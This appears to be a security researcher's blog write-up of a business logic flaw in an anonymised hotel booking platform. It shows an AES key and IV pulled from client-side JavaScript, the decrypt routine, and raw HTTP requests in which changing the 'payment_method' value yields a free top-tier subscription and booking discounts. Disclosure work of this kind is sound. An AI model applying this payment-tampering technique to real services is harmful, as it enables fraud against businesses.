---
title: "Unveiling the Hotel Booking Hack: Leveraging Business Logic Flaws for Free Subscriptions and 12% Discounts"
layout: post
date: 2023-10-31 12:00
categories: blog 
---

Business Logic Error leads to pay 0 amount for subscription and obtain 12% discount on the booking.

## Target Application Overview

The focus of our analysis is a web-based application, specifically tailored as a B2B (Business-to-Business) platform, facilitating hotel reservations along with associated amenities. This application features a subscription model, comprised of four distinct tiers: Diamond, Platinum, Gold, and Silver. Our scrutiny reveals a noteworthy vulnerability within this system, whereby a malicious entity can exploit it to gain access to the highest subscription tier without any monetary expenditure, concurrently enjoying a 12% reduction on the cost of their hotel bookings.

It is imperative to recognize that the primary differentiating factor among these subscription tiers pertains to the accrual of loyalty points for each booking transaction. To elucidate, users at the Diamond tier accumulate loyalty points at a rate 3 times the value of their bookings, Gold subscribers earn points at 2.5 times the value, Silver subscribers at twice the value, and Bronze subscribers receive loyalty points equivalent to the actual booking cost.

## Tech Stack

- Amazon
- Cloudflare WAF
- React JS
- REST API

## Exploitation
## Application Traffic Encryption

The application's data traffic is secured through a symmetric encryption-decryption process. Specifically, the application employs a symmetric algorithm, which utilizes the same key for both encryption and decryption operations.

## Analysis of JavaScript Files

Upon an in-depth examination of the JavaScript files within the application, it became apparent that the cryptographic processes occur within a centralized content delivery network. It's noteworthy that this practice extends beyond the boundaries of the current application. The organization employs a uniform approach to cryptographic and other related operations across all its applications through the centralized content delivery network.

```js
91622: function (e, t) {
      'use strict';
      t.Z = {
        apiDomain: 'https://api.target.com',
        adminDomain: 'https://admin.target.com',
        searchApiDomain: 'https://search.target.com',
        searchApiDomain: 'https://search.target.com',
        preprodApiDomain: 'https://preprod.target.com',
        bookingApiDomain: 'https://bookings.target.com',
        blogsApiDomain: 'https://secure.target.com',
        analyticsDomain: 'https://analytics.target.com',
        cdnPath: 'https://cdn.target.com',       
        s3accessKeyId: 'test-############',
        s3secretKey: 'test-############',
        s3Region: 'west',
        dataHasKey: '###################=',
        dataIVKey: 'jm8lgqa3j1d0ajus',
        zendesk: '###########################',
        giftCardUrl: 'https://join.target.com/gift-card/',
        ASSET_CDN_PATH: 'https://assets.target.com',
        consoleEnv: 'production',
        recaptchaV2Key: '###################-kAQFKNGH-',
        SHOPBACK_URL_DYNAMIC: 'https://shopback.target.org/aff_l',
        SHOPBACK_MERCHANT_ID: '#########',
        encryptionKeys: '["##_analytics_detail||VWlRMVRtTnllWEJVSVRCdUo=","club_membership_detail||RFZEVW1WMEtFQlJKSDA9"]'
      }
    }
```

After an extensive review of thousands of lines of code, i successfully extracted critical details pertaining to the encryption algorithm, mode, encryption key, and initialization vector.

```js
abc.factory('EncryptDecrypt', [
  'AppSettings',
  function () {
    return {
      encryptKEY: 'UiQ1TmNyeXBUITBudgwtbynjybJDVDUmV0KEBRJH0=',
      setkey: function (t) {
        this.encryptKEY = t
      },
      encrypt: function (t) {
        var e = this.encryptKEY,
        n = 'jm8lgqa3j1d0ajus',
        r = JSON.stringify(t);
        return CryptoJS.AES.encrypt(r, CryptoJS.enc.Utf8.parse(e), {
          iv: CryptoJS.enc.Utf8.parse(n),
          padding: CryptoJS.pad.Pkcs7,
          mode: CryptoJS.mode.CBC
        }).toString() + '---' + window.btoa(n)
      },
      decrypt: function (t) {
        var e = t.split('---'),
        n = browserCrypto.Buffer.from(e[1], 'base64'),
        r = browserCrypto.Buffer.from(e[0], 'base64'),
        a = browserCrypto.Buffer.from(this.encryptKEY),
        o = browserCrypto.createDecipheriv('aes256', a, n),
        i = o._update(r),
        s = o.final(),
        l = (i = browserCrypto.Buffer.concat([i,
        s])).toString();
        return JSON.parse(l)
      }
    }
  }
])
```

The `main.js` in the application calls the `web.js` in the CDN for the cyrptographic operations.

## Reversing the Encryption

Used the [https://www.devglan.com/online-tools/aes-encryption-decryption](https://www.devglan.com/online-tools/aes-encryption-decryption) online tool to encrypt and decrypt the request and response payloads.

## Exploitation

After clearly inspecting the requests and response it was found that the tier subscription was newly added to the application and the feature has new payment method. Since this is a new feature the application is using multiple payment methods using the parameter `payment_method` value as a identifier to identify.

### Add Membership Request

```http
PUT /api/v18/add_membership/?desktop_rewamp=true&app_type=web&device_type=web HTTP/2
Host: api.target.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/json
Content-Length: 230
Referer: https://www.target.com/
Origin: https://www.target.com
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
Authorization: Bearer token
Te: trailers

{
  "data": "IwcOhSM4zFyKR4EGlNpdepVCXptGmSFtGlFA0th9d/ah4sKVG8GfU7TpLBtPocfgT5KVd3KE8qoU6VX5Lt6bajEKmz8t/RfArX2Y0/FciXAo5Umt9EbKxlRp0vsJArfi0AYBRaPRqM0Ts+Qv3FtGlFA0th9d/ah4sKVG8GfUFtGlFA0th9d/ah4sKVG8GfUsPjl4jh6c+UETez7Bvn8VfN6A/4px2kreIA27wchp8XXiTQjl---am04bGdxYTNqMWQwYWp1cw=="
}
```

On the above checkout request i have selected the `diamond` subscription as part of my booking so i can get 12% discount for the booking and 2 months of diamond membership.

Upon carefully inspecting the payment request payload it was found that by changing the `payment_method` parameter value in the request would result in removing the additional money added for subcription. 

> Example: Changing the value from 26 to 21. 

### Payment Request

```http
POST /api/v16/purchase_add_ons/?desktop_rewamp=true&app_type=web&device_type=web HTTP/2
Host: api.target.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/json
Content-Length: 1086
Referer: https://www.target.com/
Origin: https://www.target.com
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
Authorization: Bearer token
Te: trailers

{
  "data": "QJ0Xf+WuZSnSQb3yYdxdqKWehvox11bKj8hJcRUOnvLc8mBOPq5pLKEmbB67oc9FuL+6SiyRknTKuAwlZLzlUpdBkIiLNJkNNxiDqnDXwuLu4+orwmhowtFVgd18X4WU3pKiYc6WOjCOxZ6wxdJLzyrJLcHueT7C5gD+pFI6/XvMn/8rrkaZXYgdgF6wUnkMcK87vEWX4Fbwy+/932FdpuVkX5jnGxMUcqX49jZyHZVzsuJ4JEDttUkgpatLXUGIovIz/+R9EyhKleRyGBcqzC2EHb8LqY4kQOsJAwX1gLnjMc3ukFIXSXqUutyMUpOwmM376Pzd1tVT5gHO/B3qLYpcBKssH5R2HTLQ1PgmeVORIROD4fYZ4xBjGE3KMbkUfk60DqVYD2gbOKucwQdIvLKG6K9yuG/9LgXVu9E8NvO3Vq+hnzvJQ4kZDQiQwn1qt9wVuzRrdF50x4H4J7Txl5luPBEyarraKy+vtyna2PQqc2+7+RCF49W7cLwXEoa8WHWq+hd233Kzps7q/EWxCf1dINWdSDhmVnC+KS+PbCfqkU8gye0X/92gToTx3eDIJqVbtSH7Q3bMkGMUOWQ==---am04bGdxYTNqMWQwYWp1cw=="
}
```

Since the subscription related data are passed in the application request, the application accepts the data and does a successfull booking. 

**Membership Data in the request**

```json
 {
  "user_club_membership_id": 123456,
  "diamond_club": true
 }
```

Later the application provides 2 months of diamond subscription + 12% discount on every bookings without paying any money for it.

Thanks for reading!

For more updates and insights, follow me on Twitter: [@thevillagehacker](https://twitter.com/thevillagehackr).